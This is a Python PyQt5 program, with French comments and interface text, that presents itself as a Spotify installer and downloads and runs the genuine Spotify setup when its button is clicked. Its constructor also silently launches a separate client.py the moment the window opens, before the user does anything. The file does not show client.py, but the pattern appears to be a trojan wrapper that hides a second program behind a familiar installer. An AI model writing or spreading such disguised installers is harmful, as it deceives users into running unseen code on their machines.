import sys
import os
import requests
import subprocess
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QLabel, QPushButton

class SpotifyInstaller(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.run_client()  # Lancer client.py dès le lancement

    def init_ui(self):
        self.setWindowTitle("Installateur Spotify")
        self.setGeometry(300, 300, 450, 200)

        layout = QVBoxLayout()

        self.label = QLabel("Prêt à installer Spotify")
        layout.addWidget(self.label)

        self.install_button = QPushButton("Installer Spotify")
        self.install_button.clicked.connect(self.install_and_run)
        layout.addWidget(self.install_button)

        self.setLayout(layout)

    def install_and_run(self):
        try:
            # Télécharger l'installer Spotify
            self.label.setText("Téléchargement de Spotify en cours...")
            url = "https://download.scdn.co/SpotifySetup.exe"
            installer_path = os.path.join(os.getcwd(), "SpotifySetup.exe")

            response = requests.get(url, stream=True)
            with open(installer_path, "wb") as f:
                for chunk in response.iter_content(1024):
                    f.write(chunk)

            self.label.setText("Spotify téléchargé. Lancement de l'installation...")

            # Exécuter l'installateur Spotify
            subprocess.Popen(installer_path, shell=True)

        except Exception as e:
            self.label.setText(f"Erreur : {e}")
            print(f"Erreur : {e}")

    def run_client(self):
        client_path = os.path.join(os.getcwd(), "client.py")
        if os.path.exists(client_path):
            try:
                if sys.platform == "win32":
                    subprocess.Popen(["python", client_path], shell=True)
                else:
                    subprocess.Popen(["python3", client_path])
            except Exception as e:
                print(f"Erreur lors du lancement de client.py : {e}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = SpotifyInstaller()
    window.show()
    sys.exit(app.exec_())